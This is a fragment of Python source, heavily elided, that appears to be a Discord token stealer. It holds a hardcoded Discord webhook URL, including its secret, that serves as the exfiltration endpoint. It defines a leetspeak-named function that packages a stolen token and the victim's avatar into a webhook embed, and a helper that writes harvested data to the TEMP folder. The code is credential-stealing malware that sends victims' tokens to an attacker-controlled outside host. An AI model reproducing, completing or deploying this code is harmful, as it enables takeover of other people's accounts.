...
h00k = "https://discordapp.com/api/webhooks/1190161079096053810/uy1i6JPXiIVGBgLqYDYzdpzpQ1SUUC0xSKcSkRRR36sYIxVExEBDH0kLoXzfkxdY7FKF"
...
def UP104D70K3N(token, path):
    ...
    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://png.pngtree.com/png-clipart/20220830/ourmid/pngtree-halloween-ghost-cartoon-scary-expression-sickle-png-image_6127897.png"
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://png.pngtree.com/png-clipart/20220830/ourmid/pngtree-halloween-ghost-cartoon-scary-expression-sickle-png-image_6127897.png"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://png.pngtree.com/png-clipart/20220830/ourmid/pngtree-halloween-ghost-cartoon-scary-expression-sickle-png-image_6127897.png",
        "attachments": []
        }
...
def Wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\fyren{name}.txt"
